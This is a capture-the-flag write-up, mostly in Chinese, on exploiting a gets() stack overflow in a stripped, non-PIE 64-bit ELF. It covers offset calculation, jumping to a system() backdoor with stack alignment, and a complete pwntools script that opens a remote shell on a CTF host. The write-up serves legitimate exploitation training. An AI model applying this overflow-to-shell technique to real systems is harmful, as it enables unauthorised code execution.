# Target Intelligence & Reconnaissance
(目标情报与侦察)

- Binary Type: ELF 64-bit LSB executable, dynamically linked, stripped.

- Security Mitigations (checksec):

- No Canary found: 栈保护未开启，存在典型的栈溢出漏洞利用空间。

- No PIE: 程序基址固定，这意味着我们可以直接硬编码（Hardcode）内存中的绝对地址，无需泄露基址。

- NX enabled: 栈不可执行，无法直接注入 Shellcode，因此采用 ret2text（返回到已有代码）策略。

- Stripped: 符号表被剥离，无法通过 nm 命令直接定位后门函数，需要进行逆向分析。

# The Anatomy of the Bug
(漏洞解剖)

通过 objdump 对程序进行反汇编，定位到输入接收点：

```assembly
400692: lea    -0x40(%rbp),%rax   ; 缓冲区 (buffer) 起始地址位于 rbp - 0x40
40069e: call   400500 <gets@plt>  ; 调用 gets() 函数，无边界检查
```
**漏洞成因 (Root Cause):**
程序使用了极度危险的 gets() 函数。gets() 会无限读取用户输入直到遇到换行符，且不检查目标缓冲区的大小。攻击者可以输入超长字符串，从而覆盖栈上的 saved rbp 以及 Return Address (RIP)。

**偏移计算 (Offset Calculation):**

缓冲区大小：0x40 (64 bytes)

保存的栈底指针 (saved rbp)：8 bytes

Offset = 64 + 8 = **72 bytes.**

# Controlling the Chaos
(控制流劫持与策略)

由于符号表被剥离，我们需要手动寻找控制流劫持的目标。程序运行时直接输出了一个提示 WOW:0x40060d，这往往是出题人留下的线索。通过反汇编分析该地址：

```assembly
40060d: push   %rbp
40060e: mov    %rsp,%rbp
400611: mov    $0x400734,%edi  ; 将某字符串（推测为 "/bin/sh"）的地址传给第一个参数 rdi
400616: call   4004d0 <system@plt> ; 调用 system()，可获取 shell
```
**战术微操 (Stack Alignment):**
如果直接将 RIP 劫持到 0x40060d，第一条指令 push %rbp 会使得栈指针（RSP）错位 8 字节。当程序执行到 system 内部触发 movaps 指令时，会因为 **16 字节栈对齐要求** 被破坏而直接崩溃（Core Dump）。

**解决方案:**
将目标地址加 1，即跳转到 0x40060e。这完美绕过了 push %rbp 指令，使得 RSP 保持 16 字节对齐，保障 system 函数顺利执行。

# Weaponization & Exploit
(武器化与利用)

使用 pwntools 编写自动化 EXP 脚本。利用 72 字节的垃圾数据填满缓冲区，随后覆盖返回地址为后门函数地址（0x40060e）。

```python
from pwn import *

# 配置目标环境（这里以远程靶机为例）
# context.log_level = 'debug' # 如果需要看底层收发数据可以打开
HOST = 'c38877f17f6daa72764172a2.tcp-ctf2.dasctf.com'
PORT = 9999

def exploit():
    # 1. 建立连接
    io = remote(HOST, PORT)
    
    # 2. 构造 Payload
    # 72 字节垃圾数据 + 后门地址 (跳过 push rbp)
    offset = 72
    backdoor_addr = 0x40060e
    
    payload = b'A' * offset + p64(backdoor_addr)
    
    # 3. 发送 Payload
    io.sendline(payload)
    
    # 4. 获取交互式 Shell，手动执行命令拿 Flag
    io.interactive()

if __name__ == '__main__':
    exploit()
```